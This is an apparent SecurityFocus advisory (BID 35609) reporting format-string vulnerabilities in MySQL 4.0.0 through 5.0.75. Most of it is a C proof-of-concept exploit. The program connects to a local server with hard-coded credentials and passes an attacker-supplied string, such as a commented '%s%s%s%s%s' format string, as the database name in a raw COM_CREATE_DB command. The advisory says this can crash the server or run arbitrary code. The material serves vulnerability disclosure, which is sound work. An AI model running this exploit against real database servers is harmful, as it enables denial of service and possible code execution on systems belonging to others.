source: http://www.securityfocus.com/bid/35609/info

MySQL is prone to multiple format-string vulnerabilities.

Attackers can leverage these issues to execute arbitrary code within the context of the vulnerable application. Failed attacks will likely cause denial-of-service conditions.

MySQL 4.0.0 through 5.0.75 are vulnerable; other versions may also be affected. 

#include <stdlib.h>
#include <stdio.h>

#define USE_OLD_FUNCTIONS
#include <mysql/mysql.h>

#define NullS           (char *) 0

int
main (int argc, char **argv)
{
  MYSQL *mysql = NULL;

  mysql = mysql_init (mysql);

  if (!mysql)
    {
      puts ("Init faild, out of memory?");
      return EXIT_FAILURE;
    }

  if (!mysql_real_connect (mysql,       /* MYSQL structure to use */
                           "localhost", /* server hostname or IP address */
                           "monty",      /* mysql user */
                           "montypython",  /* password */
                           NULL,      /* default database to use, NULL for none */
                           0,   /* port number, 0 for default */
                           NULL,        /* socket file or named pipe name */
                           CLIENT_FOUND_ROWS /* connection flags */ ))
    {
      puts ("Connect failed\n");
    }
  else
    {
      puts ("Connect OK\n");
//      mysql_create_db(mysql, "%s%s%s%s%s");
        simple_command(mysql, COM_CREATE_DB, argv[1], strlen(argv[1]), 0);

    }

  mysql_close (mysql);

  return EXIT_SUCCESS;
}